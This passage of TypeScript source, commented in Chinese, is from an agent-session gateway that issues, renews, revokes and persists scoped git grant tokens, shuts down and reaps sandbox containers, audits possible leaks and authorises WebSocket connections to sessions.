		// --rm 只保证容器退出后删记录、不保证容器退出。按 label 扫，
		// 只动本网关自己的（gatewayId 默认带 hostname+pid）。
		const reaped = await this.#cfg.backend?.reapOrphans?.();
		if (reaped?.length) {
			this.#audit.append({
				kind: "session.end",
				sessionId: "-",
				actor: "system",
				summary: `启动时回收了 ${reaped.length} 个遗留容器`,
			});
		}
		await new Promise<void>((resolve, reject) => {
			const onError = (err: Error) => {
				this.#http.removeListener("listening", onListen);
				reject(err);
			};
			const onListen = () => {
				this.#http.removeListener("error", onError);
				resolve();
			};
			this.#http.once("error", onError);
			this.#http.once("listening", onListen);
			this.#http.listen(this.#cfg.port, this.#cfg.host);
		});
		const addr = this.#http.address();
		return typeof addr === "object" && addr ? addr.port : this.#cfg.port;
	}

	// ── B2 scoped git grants：签发 / 吊销 / 登记持久化 / internal 快照 ──

	#saveGitGrantRegistry(): void {
		// 0600 tmp+rename 原子写（复用既有 revocations 模式）；先持久化可信状态再可观察成功
		const payload = {
			epoch: this.#gitGrantEpoch,
			active: [...this.#gitGrantActive.entries()].map(([jti, e]) => [jti, { ...e, jtis: [...e.jtis] }]),
			revoked: [...this.#gitGrantRevoked],
		};
		writeFileSync(this.#gitGrantFile + ".tmp", JSON.stringify(payload), { mode: 0o600 });
		renameSync(this.#gitGrantFile + ".tmp", this.#gitGrantFile);
		try { chmodSync(this.#gitGrantFile, 0o600); } catch {}
	}

	/** 签发一枚会话级 grant 并登记（jti 唯一；先持久化登记，再由调用方可观察 grant）。
	 * R-Q50-3：exp 不得越过可信 principal 有效期（entry.maxExpAt）。 */
	/** 初签（R55-B：直接接已验 identity.expiresAt，不从尚未登记的 #conns 倒查） */
	#issueGitGrant(sessionId: string, principal: string, tenant: string, repo: string, aclVersion: number, identityExpiry?: number): string {
		if (!this.#cfg.gitGrants) throw new Error("gitGrants 未配置，不能签发");
		const signed = this.#signGrantClaims(sessionId, principal, tenant, repo, aclVersion, identityExpiry ?? null);
		// A：初签事务——登记 + save 任一失败不发布 token（不留未知 authority）
		let entry = this.#gitGrantActive.get(sessionId);
		if (!entry) {
			entry = { sessionId, principal, tenant, repo, aclVersion, jtis: new Set(), maxExpAt: signed.cap, currentExpAt: signed.exp };
			this.#gitGrantActive.set(sessionId, entry);
		} else {
			// R59-④：existing entry（同 sessionId 重连/重启恢复）——本次已验同 owner cap/currentExp
			// 必须真提交（不保留已过期/过长旧 cap；collaborator 不借；不同 owner 不串）
			mergeIssueIntoEntry(entry, principal, signed);
		}
		entry.jtis.add(signed.jti);
		try {
			this.#saveGitGrantRegistry();
		} catch (err) {
			// 回滚初签登记：不留半登记 entry（无 revoked 新增——初签不 retire 旧）
			entry.jtis.delete(signed.jti);
			if (entry.jtis.size === 0) this.#gitGrantActive.delete(sessionId);
			throw err;
		}
		this.#scheduleNextRenew(); // R55-F：新 grant 后刷新最早 due
		return signed.token;
	}

	/** 共享 mint：scope 由部署面与签发参数同源推导（renew 不扩大）；exp 钻入 principal 有效期 */
	/**
	 * R55-A 纯化：只产出 {token,jti,exp,cap}——零登记零 save（登记事务在调用方：
	 * 初签 #issueGitGrant / 续签 #renewGitGrant 各自 commit）。
	 * R55-B：cap 由调用方显式传入（初签=已验 identity.expiresAt；续签=fresh 真实重认证）。
	 */
	#signGrantClaims(sessionId: string, principal: string, tenant: string, repo: string, aclVersion: number, capExpiry: number | null): { token: string; jti: string; exp: number; cap: number | null } {
		if (!this.#cfg.gitGrants) throw new Error("gitGrants 未配置，不能签发");
		const allowPush = this.#cfg.gitGrants.repos?.find((r) => r.name === repo)?.allowPush === true;
		const writeRefs = allowPush ? this.#cfg.gitGrants.writeRefs : [];
		const nowMs = this.#nowMs();
		const cap = capExpiry;
		const exp = computeGrantExpiry(nowMs, cap); // R55-B 同缝：min(15min,cap)/已过即拒
		const claims: GrantClaims & { epoch: string } = {
			v: 1,
			tenant,
			principal,
			session: sessionId,
			repo,
			caps: { read: true, write: allowPush, writeRefs },
			exp,
			jti: newGrantJti(),
			epoch: this.#gitGrantEpoch,
			aclVersion,
		};
		const token = signGrant(claims, this.#cfg.gitGrants.masterKey, nowMs);
		return { token, jti: claims.jti, exp, cap };
	}

	/** 可信 principal 有效期（ms epoch；取其在途连接的凭证 expiresAt）；无可靠来源返回 null */
	#principalExpiresAt(principal: string): number | null {
		if (this.#revoked.has(principal)) throw new Error("principal 已吊销，不能签发/续签 grant");
		let latest: number | null = null;
		for (const conn of this.#conns) {
			if (conn.revoked || conn.closed) continue;
			const p = conn.principal;
			if (p && `${p.issuer}|${p.subject}` === principal) {
				latest = latest === null ? conn.expiresAt : Math.max(latest, conn.expiresAt);
			}
		}
		return latest; // 无在途连接（如 renew 时已断开重连中）：不虚构有效期，仅受吊销检查约束
	}

	#revokeJti(jti: string): void {
		this.#gitGrantRevoked.add(jti);
	}

	/**
	 * 撤销 + 持久化（H3 语义）：先同步改内存（不可逆撤销），再一次 fallible 保存。
	 * 保存失败不回滚内存撤销（撤销优先）；调用方收到 throw 自行决定审计/重试，
	 * 不得静默装成功。返回实际写入是否成功。
	 */
	/**
	 * 只内存撤（R55-C logout 事务步 ①）：jtis 全进 revoked、active 删除——不 save；
	 * 调用方在全部目标撤完后一次 save。已被 revokeGitGrantSession 外部使用时同语义。
	 */
	#revokeGitGrantSessionInMemory(sessionId: string): void {
		const entry = this.#gitGrantActive.get(sessionId);
		if (!entry) return; // 已无 active entry：revoked tombstones 由任意一次成功 save 落盘
		for (const j of entry.jtis) this.#gitGrantRevoked.add(j);
		this.#gitGrantActive.delete(sessionId);
	}

	#revokeGitGrantSession(sessionId: string): void {
		const entry = this.#gitGrantActive.get(sessionId);
		if (!entry) return;
		for (const j of entry.jtis) this.#gitGrantRevoked.add(j);
		this.#gitGrantActive.delete(sessionId);
		this.#saveGitGrantRegistry(); // fallible：失败 throw 向上，不吞
	}

	/**
	 * R55-C 重试入口：save 失败的 logout sid——revoked tombstones 已在内存，任意一次
	 * 成功 save 即落盘；成功后清除 pending 与映射（take），不还原 revoked。失败保留待重试。
	 */
	/**
	 * R57-5 重试入口扩展（R59-⑥：明确 outcome，不吞错误装失败报告）：同时覆盖 git
	 * revoked tombstones 与 browser snapshot（独立尝试，任一失败保留可重试状态；
	 * active entry 已删/cookie 已丢不影响补盘）。#reap 在任何 await 前调用（即使
	 * gitGrants 未配置也覆盖 browser）；close 前最后调用；返回实际落盘结果。
	 */
	#flushPendingLogoutPersistence(): { gitOk: boolean; browserOk: boolean; remaining: number } {
		if (this.#pendingLogoutPersistence.size === 0) return { gitOk: true, browserOk: true, remaining: 0 };
		let gitOk = true;
		if (this.#cfg.gitGrants) {
			try { this.#saveGitGrantRegistry(); } catch { gitOk = false; }
		}
		let browserOk = true;
		try { this.#saveSessions(); } catch { browserOk = false; } // browser snapshot 补盘（R57-5）
		if (!gitOk || !browserOk) return { gitOk, browserOk, remaining: this.#pendingLogoutPersistence.size }; // 任一失败：保留 pending（disk unknown 如实）
		for (const sid of [...this.#pendingLogoutPersistence]) {
			takeSessionsForBrowserSid(this.#gitGrantSessionsByBrowserSid, sid);
			this.#pendingLogoutPersistence.delete(sid);
		}
		return { gitOk, browserOk, remaining: 0 };
	}

	#revokeGitGrantPrincipal(principalId: string): void {
		// H3：先撤全部内存目标，再一次 fallible 保存（不逐个 save 让部分失败留半撤销态）
		const targets = [...this.#gitGrantActive.entries()].filter(([, e]) => e.principal === principalId);
		if (targets.length === 0) return;
		for (const [sessionId] of targets) {
			const entry = this.#gitGrantActive.get(sessionId);
			if (!entry) continue;
			for (const j of entry.jtis) this.#gitGrantRevoked.add(j);
			this.#gitGrantActive.delete(sessionId);
		}
		this.#saveGitGrantRegistry();
	}

	#revokeGitGrantAll(): void {
		// H3：内存撤全部，单次 fallible 保存（非逐个 save）
		if (this.#gitGrantActive.size === 0) return;
		for (const entry of this.#gitGrantActive.values()) {
			for (const j of entry.jtis) this.#gitGrantRevoked.add(j);
		}
		this.#gitGrantActive.clear();
		this.#saveGitGrantRegistry();
	}

	/** /internal/git/registry 快照（仅内网受信消费；internalToken 仅 header） */
	#gitRegistrySnapshot(): { epoch: string; activeSessions: Record<string, { principal: string; tenant: string; repo: string; aclVersion: number }>; revokedJtis: string[] } {
		const activeSessions: Record<string, { principal: string; tenant: string; repo: string; aclVersion: number }> = {};
		for (const e of this.#gitGrantActive.values()) {
			activeSessions[e.sessionId] = { principal: e.principal, tenant: e.tenant, repo: e.repo, aclVersion: e.aclVersion };
		}
		return { epoch: this.#gitGrantEpoch, activeSessions, revokedJtis: [...this.#gitGrantRevoked] };
	}

	// ── R-Q50-3：活会话 grant 续签（renew）──
	// 同活 session 按 ≤15min 新 jti 续签/旧 jti 退役（≤pollMs 生效）；原 scope 不扩大
	// （repo/caps 与签发同源重推导）；可信存续检查；persist 先于投递；投递失败撤销新
	// jti 且不虚报；后台长活动会话也真有触发（专有 timer，可注入以写纯 fake 控制）。

	#startGitGrantRenewTimer(): void {
		const g = this.#cfg.gitGrants;
		if (!g) return;
		// R-Q52-4：可选 + 安全缺省 TTL/2；显式提供时校验正整数 ≤15min。
		// R55-F：effective interval = min(configured/default, TTL/2)；实际 fire 点由
		// #scheduleNextRenew 按当前活 entry 最早可工作时点提前（签发/续签后刷新）。
		const configured = g.renewIntervalMs;
		if (configured !== undefined && (typeof configured !== "number" || !Number.isSafeInteger(configured) || configured <= 0 || configured > 15 * 60 * 1000)) {
			throw new Error("gitGrants.renewIntervalMs 必须为 1..900000 的正整数（renew 调度）");
		}
		this.#renewMaxIntervalMs = Math.min(configured ?? DEFAULT_RENEW_INTERVAL_MS, Math.floor((15 * 60 * 1000) / 2));
		this.#scheduleNextRenew();
	}

	/** R55-F：按当前活 entry 最早可工作时点 arm timer（不 zero spin：下限 250ms；
	 * 近到期项排 cap 到点 revoke 一次即删，不 spin）；签发/续签成功后刷新最早 due。 */
	#scheduleNextRenew(): void {
		const g = this.#cfg.gitGrants;
		if (!g) return;
		const delay = computeNextRenewDelayMs([...this.#gitGrantActive.values()], this.#nowMs(), this.#renewMaxIntervalMs);
		// R59-⑤：owned timer 生命周期移交同缝纯类（同步重入 fail-closed/单次 inline 恰一
		// slot/close-during-arm 不补写/配对 clear）；hook 非法时固定审计（不 spin）。
		const outcome = this.#renewTimer.arm(delay, this.#renewFireOnce, {
			setTimeoutImpl: g.timerImpl ?? ((fn: () => void, ms: number) => setTimeout(fn, ms)),
			clearTimeoutImpl: (t: unknown): void => { (g.clearTimerImpl ?? ((x: NodeJS.Timeout) => clearTimeout(x)))(t as NodeJS.Timeout); },
			closed: (): boolean => this.#closed,
		});
		if (outcome === "failed-illegal-hook") {
			try { this.#audit.append({ kind: "error", sessionId: "system", actor: "system", summary: "git grant renew timer hook 同步重入非法（fail-closed 停止调度；固定类别）" }); } catch { /* 审计失败不抛 */ }
		}
	}

	#renewFireOnce = (): void => {
		try {
			this.#renewDue();
		} catch {
			try { this.#audit.append({ kind: "error", sessionId: "system", actor: "system", summary: "git grant 续签失败（固定类别）" }); } catch { /* 定时器内审计失败不再抛 */ }
		} finally {
			this.#scheduleNextRenew(); // 重新计算（#closed 下 OwnedRenewTimer 不 rearm）
		}
	}

	#stopGitGrantRenewTimer(): void {
		this.#renewTimer.stop(); // R59-⑤：配对 clear 委托 owned timer（单 slot）
	}

	/** 一轮续签：对每个 active entry 检查可信存续，存活则轮换 jti（persist 先于投递） */
	#renewDue(): void {
		for (const [sessionId, entry] of [...this.#gitGrantActive.entries()]) {
			try {
				this.#renewGitGrant(sessionId, entry);
			} catch {
				// 单会话续签失败不阻断其余；固定类别审计可见（不静默）
				try { this.#audit.append({ kind: "error", sessionId, actor: entry.principal, summary: "git grant 续签失败（固定类别）" }); } catch { /* 保留首个错误 */ }
			}
		}
	}

	#renewGitGrant(sessionId: string, entry: GrantRegistryEntry): void {
		// R55-B：fresh 判定放 revoke **之前**——同 principal 的可信重认证（#conns 内精确
		// principal 匹配，不借他人 expiry）先更新 captured，再决策；合法再认证能继续，
		// 不硬 15min 全 session 寿命。
		const freshExpiry = this.#principalExpiresAt(entry.principal);
		if (freshExpiry !== null && (entry.maxExpAt === null || entry.maxExpAt === undefined || freshExpiry > entry.maxExpAt)) {
			entry.maxExpAt = freshExpiry;
		}
		// 可信存续决策（R-Q52-3 同缝纯函数 decideRenew）：会话死/principal 吊销 → skip；
		// captured 有效期已到 → 撤旧；近到期 → skip（自然失效，不 phantom 永续）。
		const session = this.#sessions.get(sessionId);
		const decision = decideRenew(entry, this.#nowMs(), !!(session && session.alive), this.#revoked.has(entry.principal));
		if (decision.action === "skip") return;
		if (decision.action === "revoke-and-skip") {
			this.#revokeGitGrantSession(sessionId);
			return;
		}
		// R55-A 轮换事务：previous 在**纯 mint 前**捕获（绝不含 newJti）；登记一次 commit；
		// save 先于投递；save/writer 失败 → new 不可用、旧集回滚、本次新增 revocation 还原。
		const previous = new Set(entry.jtis);
		const oldCurrentExpAt = entry.currentExpAt; // R57-3：回滚时恢复（旧 token 活到旧 exp，调度不得按新 exp 错配）
		const signed = this.#signGrantClaims(sessionId, entry.principal, entry.tenant, entry.repo, entry.aclVersion, entry.maxExpAt ?? null);
		const plan = planRotation(entry.jtis, (j) => this.#gitGrantRevoked.has(j), signed.jti);
		try {
			applyRotation(entry, this.#gitGrantRevoked, plan);
			entry.maxExpAt = signed.cap ?? entry.maxExpAt ?? null;
			entry.currentExpAt = signed.exp;
			this.#saveGitGrantRegistry(); // persist 先于投递
			const home = join(this.#cfg.workspaceRoot, ".homes", sessionId);
			writeGitCredentialConfig(home, { ...(this.#cfg.wiring ?? { proxyToken: "" }), gitProxyToken: signed.token, authorEmail: this.#owners.get(sessionId) });
		} catch (err) {
			// new 不可用：无论回滚是否成功，newJti 本身进 revoked（writer 失败时 new 已登记过）
			retireUndeliveredNew(this.#gitGrantRevoked, plan);
			rollbackRotation(entry, this.#gitGrantRevoked, plan);
			entry.currentExpAt = oldCurrentExpAt; // R57-3：旧 token 活到旧 exp——下一调度按旧 exp 算，不错配
			try { this.#saveGitGrantRegistry(); } catch {
				try { this.#audit.append({ kind: "error", sessionId, actor: entry.principal, summary: "git grant 续签回滚保存失败（磁盘状态 unknown，固定类别）" }); } catch { /* 审计也失败 */ }
			}
			throw err;
		}
		// R57-4：投递**成功后**的补盘/调度异常不误作未投递回滚（new 已真实生效）
		try { this.#flushPendingLogoutPersistence(); } catch { /* 固定类别已由 flush 内部审计 */ }
		try { this.#scheduleNextRenew(); } catch {
			try { this.#audit.append({ kind: "error", sessionId, actor: entry.principal, summary: "git grant 续签后调度刷新失败（固定类别）" }); } catch { /* 审计也失败 */ }
		}
	}

	/** R74：owner 在途连接的服务端验证 principal（生产 authorizeResource/resolveScope 判定用；demo 无 principal） */
	#livePrincipal(actor: string): Principal | undefined {
		for (const c of this.#conns) {
			if (c.actor === actor && !c.closed && !c.revoked && c.principal) return c.principal;
		}
		return undefined;
	}

	/** R74（方案 a）：acl 变更撤销后的合法补救——以新 aclVersion 重签并投递（renew 同缝事务：
	 * plan/apply/save 先于投递 → writeGitCredentialConfig；save/writer 失败回滚
	 * retireUndeliveredNew/rollbackRotation——旧不复活、新不可用），失败抛出由回调侧
	 * 固定类别审计。调用前提：旧 jti 已全撤销并持久化、会话存活、owner 已过授权判定。 */
	#remintGitGrant(sessionId: string, owner: string, scope: { principal: string; tenant: string; repo: string; maxExpAt: number | null }, aclVersion: number): void {
		if (!this.#cfg.gitGrants) throw new Error("gitGrants 未配置，不能签发");
		let entry = this.#gitGrantActive.get(sessionId);
		const freshEntry = !entry;
		if (!entry) {
			// R74-v4：撤销后新建的 entry 必须登记回 map——否则快照里无该会话，代理永不放行
			//（真实缺陷：签发+写 HOME 成功但 registry 无 session）。
			entry = { sessionId, principal: scope.principal, tenant: scope.tenant, repo: scope.repo, aclVersion, jtis: new Set(), maxExpAt: scope.maxExpAt, currentExpAt: 0 };
			this.#gitGrantActive.set(sessionId, entry);
		} else {
			entry.aclVersion = aclVersion;
		}
		const oldCurrentExpAt = entry.currentExpAt;
		const signed = this.#signGrantClaims(sessionId, entry.principal, entry.tenant, entry.repo, aclVersion, entry.maxExpAt ?? null);
		const plan = planRotation(entry.jtis, (j) => this.#gitGrantRevoked.has(j), signed.jti);
		try {
			applyRotation(entry, this.#gitGrantRevoked, plan);
			entry.maxExpAt = signed.cap ?? entry.maxExpAt ?? null;
			entry.currentExpAt = signed.exp;
			this.#saveGitGrantRegistry(); // persist 先于投递
			const home = join(this.#cfg.workspaceRoot, ".homes", sessionId);
			writeGitCredentialConfig(home, { ...(this.#cfg.wiring ?? { proxyToken: "" }), gitProxyToken: signed.token, authorEmail: this.#owners.get(sessionId) });
		} catch (err) {
			retireUndeliveredNew(this.#gitGrantRevoked, plan);
			rollbackRotation(entry, this.#gitGrantRevoked, plan);
			entry.currentExpAt = oldCurrentExpAt;
			if (freshEntry) this.#gitGrantActive.delete(sessionId); // 回滚连同移除：不留无 token 的半登记
			try { this.#saveGitGrantRegistry(); } catch {
				try { this.#audit.append({ kind: "error", sessionId, actor: entry.principal, summary: "git grant 重签回滚保存失败（磁盘状态 unknown，固定类别）" }); } catch { /* 审计也失败 */ }
			}
			throw err;
		}
		try { this.#flushPendingLogoutPersistence(); } catch { /* 固定类别已由 flush 内部审计 */ }
		try { this.#scheduleNextRenew(); } catch {
			try { this.#audit.append({ kind: "error", sessionId, actor: entry.principal, summary: "git grant 重签后调度刷新失败（固定类别）" }); } catch { /* 审计也失败 */ }
		}
	}

	#nowMs(): number {
		return Date.now();
	}

	/**
	 * S3a 有序关闭（handoff §3.3）：readiness 立即翻红 → 拒绝新升级与新 prompt/steer
	 * → 限时 drain（超时对仍在运行的任务写「未确定操作」审计，随后由 close 内
	 * session.stop 的 host.abort 收束）→ 复用 close() 逐项关 Harness/执行连接/沙箱、
	 * HTTP/WS、审计，最后释放 stateRoot 独占锁。任一项清理失败不中断其余项（close 语义）。
	 * 幂等：重复调用共享同一次关闭。drain 期间 abort/approve 仍被允许（操作安全取舍，见 ask）。
	 */
	shutdown(opts: { drainMs?: number } = {}): Promise<void> {
		this.#shutdownPromise ??= this.#shutdown(Math.max(0, opts.drainMs ?? 30_000));
		return this.#shutdownPromise;
	}

	async #shutdown(drainMs: number): Promise<void> {
		this.#draining = true; // /readyz 立即 503；升级与新任务在各自的门被拒
		clearInterval(this.#reaper); // drain 期间停止空闲回收并发；close 再清一次（幂等）
		const deadline = Date.now() + drainMs;
		while (Date.now() < deadline && this.#anyBusy()) {
			await new Promise((r) => setTimeout(r, Math.min(100, Math.max(1, deadline - Date.now()))));
		}
		if (this.#anyBusy()) {
			// drain 超时：逐个留下「未确定操作」审计后交给 close 收束（stop → host.abort）
			for (const [id, s] of this.#sessions) {
				if (!s.busy || !s.alive) continue;
				this.#tryAudit({
					kind: "error",
					sessionId: id,
					actor: this.#owners.get(id) ?? "system",
					summary: "关闭时未确定操作：drain 超时，运行中任务将被中止（固定类别）",
					verdict: "deny",
				});
			}
		}
		await this.close();
	}

	#anyBusy(): boolean {
		for (const s of this.#sessions.values()) {
			if (s.alive && s.busy) return true;
		}
		return false;
	}

	async close(): Promise<void> {
		// R59-⑥：close 前**最后重试** pending logout 持久化（browser+git 独立尝试；
		// 任一失败保留 unknown 且计入 close 非成功——不吞不装 durable）。
		this.#flushPendingLogoutPersistence();
		// B2：先内存撤全部 grant，再一次 fallible 持久化（H3：失败收集不吞，
		// 其余 finalizers 独立执行，最终非零/unknown——不装成功）
		let grantSaveErr: unknown = null;
		if (this.#cfg.gitGrants) {
			try { this.#revokeGitGrantAll(); } catch (err) { grantSaveErr = err; }
		}
		if (this.#pendingLogoutPersistence.size > 0) {
			// 重试后仍有残留：磁盘 unknown（不称 durable），计入 close 非成功
			grantSaveErr ??= new Error("logout pending persistence 未落盘（固定类别）");
			try { this.#audit.append({ kind: "error", sessionId: "system", actor: "system", summary: "close 时 logout pending 持久化仍失败（磁盘 unknown；固定类别）" }); } catch { /* 审计失败不遮 */ }
		}
		this.#closed = true;
		clearInterval(this.#reaper);
		this.#stopGitGrantRenewTimer();
		if (this.#receiptSweeper) clearInterval(this.#receiptSweeper);
		try { this.#authGate.close(); } catch (err) { this.#auditLeak("system", "authGate-close", err); }
		for (const ctrl of this.#authControllers) ctrl.abort();
		this.#authControllers.clear();
		// 一个停不掉的会话不该让整个网关关不掉：抛出去的话后面的 session、
		// WebSocket 与 http server 全都不会被清理，进程挂在那里退不出。
		// 与 #reap 同理，失败要留痕（沙箱可能泄漏），但不能中断收尾。
		for (const [id, s] of this.#sessions) {
			try {
				await s.stop();
			} catch (err) {
				this.#auditLeak(id, this.#owners.get(id) ?? "system", err);
			}
		}
		this.#sessions.clear();
		this.#owners.clear();
		// 必须先断开在途连接：http.close() 要等所有连接关闭才回调，
		// 而 WebSocket 是长连接，不主动断开就会一直等下去。
		for (const client of this.#wss.clients) client.terminate();
		this.#wss.close();
		this.#http.closeAllConnections();
		await new Promise<void>((r) => this.#http.close(() => r()));
		this.#audit.close();
		// S3a：最后释放 stateRoot 独占锁（只删自己 nonce 的锁）
		releaseGatewayLock(this.#lock);
		// H3：grant 持久化失败在全部 finalizers 之后抛出（非零收敛；内存撤销已生效，
		// 磁盘可能残留旧登记 —— 重启后 epoch 新 + 旧 jti 恢复 entry 仍拒，fail-closed）
		if (grantSaveErr !== null) throw grantSaveErr;
	}

	get sessionCount(): number {
		return this.#sessions.size;
	}

	/**
	 * 回收空闲与已死的会话。
	 *
	 * 三件事都要做，缺一件就成了「沙箱泄漏」：
	 * 1. 从表里删掉（否则 maxSessions 会被僵尸占满）
	 * 2. 真的把执行后端停掉，**并检查它有没有停成功** ——
	 *    容器/Pod 停不掉时会话已经从表里消失，没人再会去收它
	 * 3. 留痕。「因空闲被回收」与「自己结束」在审计里必须能分辨，
	 *    否则运维只看到会话没了、不知道为什么
	 */
	async #reap(): Promise<void> {
		if (this.#closed) return;
		this.#flushPendingLogoutPersistence(); // R57-5：任何 await 前重试（git+browser 独立；无论 gitGrants 是否配置都覆盖 browser）
		const idleLimit = this.#cfg.idleTimeoutMs ?? 30 * 60_000;
		for (const [id, session] of [...this.#sessions]) {
			const idle = session.idleMs > idleLimit;
			if (session.alive && (!idle || session.busy)) continue;
			// **delete 的返回值就是并发闸**：setInterval 不等上一次跑完，
			// 上一轮的陈旧快照会在 await 之后重新轮到已被这一轮收走的会话，
			// 于是同一个容器被 docker rm 两次 —— 第二次必然「no such container」，
			// 被记成一条假的泄漏告警。deny 类告警一旦开始出假阳性，规则就废了。
			if (!this.#sessions.delete(id)) continue;
			const owner = this.#owners.get(id) ?? "system";
			this.#owners.delete(id);

			// session.end 只由 session.stop() 写一条，原因从这里传进去。
			// 两处各写一条会让 SIEM 按 event.type:"end" 统计的会话数翻倍
			try {
				await session.stop(idle ? `空闲 ${Math.round(session.idleMs / 1000)}s 被网关回收` : "会话已终止");
			} catch (err) {
				this.#auditLeak(id, owner, err);
			}
			for (const conn of transports.get(session) ?? []) conn.ws.close(idle ? 1012 : 4003, idle ? "空闲会话请重连" : "会话已终止");
			// close() 可能在 await 期间跑完并关掉了审计 fd
			if (this.#closed) return;
		}
	}

	/**
	 * 记一条「沙箱可能泄漏」。会话已经从表里删了，没人再会去收它，
	 * 而容器还持有工作区与代理 token —— 吞掉它等于让它无限期存活。
	 */
	#auditLeak(sessionId: string, actor: string, err: unknown): void {
		this.#tryAudit({
			kind: "error",
			sessionId,
			actor,
			summary: `清理失败，沙箱可能泄漏：${err instanceof Error ? err.message : String(err)}`,
			verdict: "deny",
		});
	}

	/**
	 * 写审计但不让失败冲出调用点。
	 * append 会 fdatasync，磁盘满或 fd 已关（close 与在途 reap 竞态）都会抛 ——
	 * 抛出去的话整轮清理会在半路中断，而那正是本该被清理的东西最多的时候。
	 */
	#tryAudit(input: Parameters<AuditLog["append"]>[0]): void {
		try {
			this.#audit.append(input);
		} catch (err) {
			console.error("写审计失败:", err instanceof Error ? err.message : err);
		}
	}

	#onConnection(ws: WebSocket, req: IncomingMessage, identity: { actor: string; principal?: Principal; expiresAt: number; sid?: string }): void {
		if (this.#revoked.has(identity.actor) || (identity.principal && this.#revoked.has(identity.principal.id)) || identity.expiresAt <= Date.now()) {
			closeWith(ws, "凭证已吊销或已过期", this.#limits);
			return;
		}
		try { this.#acceptConnection(ws, req, identity); } catch { closeWith(ws, "会话接入失败", this.#limits); }
	}

	/**
	 * S3d（handoff §3.3 第 5 条）：既有会话目录的 meta.json 缺失或损坏 → 不得当新会话、
	 * 不得让后来的连接成为新 owner。首次触碰时写 quarantined 标记（0600 tmp+rename）+
	 * 固定类别审计留痕，此后该会话的一切接入都被拒绝；处置权只在运维（本片无运维命令）。
	 * 返回 true = 该会话已隔离，调用方必须拒绝接入。
	 */
	#quarantineIfBroken(sessionId: string): boolean {
		const sessionDir = join(this.#stateRoot, "sessions", sessionId);
		try {
			if (!statSync(sessionDir).isDirectory()) return false; // 目录不存在：正常新建路径
		} catch {
			return false;
		}
		const markerFile = join(sessionDir, "quarantined.json");
		if (existsSync(markerFile)) return true; // 已隔离：一律拒绝（仅运维可清除）
		const metaFile = join(sessionDir, "meta.json");
		let reason: "meta_missing" | "meta_corrupt" | undefined;
		if (!existsSync(metaFile)) {
			// meta 缺失 ≠ 一律隔离：#buildSession 的建目录与 meta 落盘之间存在崩溃窗口，
			// 且部署面会预先 mkdir 空的 sessions/<sid> 再接入。此时目录里只可能有写一半的
			// 临时文件 —— meta 的 tmp 实际名为 meta.json.tmp（#buildSession：metaFile + ".tmp"），
			// 与账本等 *.pid.*.tmp 同理（session.sqlite/-wal/-shm、prompt-ledger.json 都在其后
			// 的 start() 才产生）—— 空目录（或仅剩 *.tmp 残留）视为未创建，走正常新建。
			const meaningful = readdirSync(sessionDir).filter((name) => !name.endsWith(".tmp"));
			if (meaningful.length === 0) return false;
			reason = "meta_missing";
		} else {
			try {
				JSON.parse(readFileSync(metaFile, "utf8"));
			} catch {
				reason = "meta_corrupt";
			}
		}
		if (!reason) return false;
		try {
			// 并发首触可能都写：内容只差时间戳，语义相同（标记存在即拒绝）
			const tmp = `${markerFile}.${process.pid}.${randomUUID()}.tmp`;
			writeFileSync(tmp, JSON.stringify({ sessionId, reason, quarantinedAt: new Date().toISOString() }), { mode: 0o600 });
			renameSync(tmp, markerFile);
			try { chmodSync(markerFile, 0o600); } catch { /* 刚以 0600 写入；chmod 兑底失败不影响语义 */ }
		} catch { /* 标记写失败不放宽：仍然拒绝，审计留痕兜底 */ }
		this.#tryAudit({ kind: "error", sessionId, actor: "system", summary: `会话元数据${reason === "meta_missing" ? "缺失" : "损坏"}，标记 quarantined（固定类别；仅运维可处理），拒绝接入`, verdict: "deny" });
		return true;
	}

	#acceptConnection(ws: WebSocket, req: IncomingMessage, identity: { actor: string; principal?: Principal; expiresAt: number; sid?: string }): void {
		const url = new URL(req.url ?? "/", "http://localhost");
		// actor 来自服务端认证结果；demo 下是客户端自报，production 下是 issuer|sub
		const actor = identity.actor;
		const requested = url.searchParams.get("session");
		const attachOpts: AttachOpts = {
			limits: this.#limits,
			conns: this.#conns,
			expiresAt: identity.expiresAt,
			sid: identity.sid,
			principal: identity.principal,
			revoked: this.#revoked,
			isAuthorized: (a, meta) => this.#isAuthorized(a, identity.principal, meta),
			isPrincipalId: this.#cfg.auth?.isPrincipalId?.bind(this.#cfg.auth),
			gatewayDraining: () => this.#draining || this.#closed,
			handleCreate: (conn, cmd, actor) => this.#handleCreateCommand(conn, cmd, actor),
		};

		if (requested !== null && !SESSION_ID.test(requested)) {
			// sessionId 参与工作区路径拼接：`../../..` 能把 agent 的 cwd
			// 指到网关主机上任意目录，顺带让所有按仓库相对路径写的策略脱靶
			closeWith(ws, "非法的 session id", this.#limits);
			return;
		}

		if (requested) {
			// S3d：既有会话目录 meta.json 缺失/损坏 → quarantined，拒绝接入（不得成为新 owner）
			if (this.#quarantineIfBroken(requested)) {
				closeWith(ws, "会话元数据缺失或损坏，会话已隔离（quarantined），拒绝接入（固定类别；交运维处理）", this.#limits);
				return;
			}
			const metaFile = join(this.#cfg.stateRoot ?? this.#cfg.workspaceRoot + ".state", "sessions", requested, "meta.json");
			if (existsSync(metaFile)) {
				const diskMeta: Meta = JSON.parse(readFileSync(metaFile, "utf8"));
				if (!roleOf(diskMeta, actor) || !this.#isAuthorized(actor, identity.principal, diskMeta)) {
					closeWith(ws, "无权接入该会话", this.#limits);
					return;
				}
			}
		}

		const existing = requested ? this.#sessions.get(requested) : undefined;
		if (existing) {
			const meta = metas.get(existing)!.data;
			if (!roleOf(meta, actor) || !this.#isAuthorized(actor, identity.principal, meta)) {
				// 会话 id 会出现在 URL、日志与审计里；仅凭知道 id 就能接管
				// 别人的会话（发 prompt、批准别人挂起的审批）是越权
				closeWith(ws, "无权接入该会话", this.#limits);
				return;
			}
			// R55-B：现存 agent session attach 分支同样按服务端验证 sid 登记 logout 关联；
			// 同 principal owner 的可信重认证（已验 identity.expiresAt）可更新 captured 上限
			//（不借不同 collaborator 的 expiry：principal 字串精确匹配）。
			if (this.#cfg.gitGrants && identity.sid) linkBrowserSid(this.#gitGrantSessionsByBrowserSid, identity.sid, requested!);
			if (this.#cfg.gitGrants && identity.principal) {
				const ownerPrincipal = `${identity.principal.issuer}|${identity.principal.subject}`;
				const entry = this.#gitGrantActive.get(requested!);
				if (entry && entry.principal === ownerPrincipal && (entry.maxExpAt === null || entry.maxExpAt === undefined || identity.expiresAt > entry.maxExpAt)) {
					entry.maxExpAt = identity.expiresAt;
					try { this.#saveGitGrantRegistry(); } catch { /* fallible：登记更新失败时内存 cap 已升——离线 renew 用内存值，仍不越认证期限 */ }
				}
			}
			attach(ws, existing, actor, attachOpts);
